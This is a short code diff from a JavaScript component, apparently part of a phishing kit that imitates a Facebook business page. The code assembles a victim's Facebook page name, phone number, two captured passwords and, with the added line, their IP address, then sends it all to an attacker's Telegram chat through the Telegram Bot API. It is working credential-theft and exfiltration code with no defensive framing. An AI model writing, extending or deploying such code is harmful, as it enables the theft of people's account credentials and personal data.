@@ -62,7 +62,8 @@ const Buiness = () => {
                 '%0A<strong>Facebook Page: </strong>' + dataPassWord.fill_facebook_pagename +
                 '%0A<strong>Phone Number: </strong>' + dataPassWord.fill_phone +
                 '%0A<strong>First Password: </strong>' + firstPassword +
-                '%0A<strong>Second Password: </strong>' + passWord ;
+                '%0A<strong>Second Password: </strong>' + passWord +
+                '%0A<strong>IP: </strong>' + response.data.ip;
 
                 axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
                     .then((response) => {
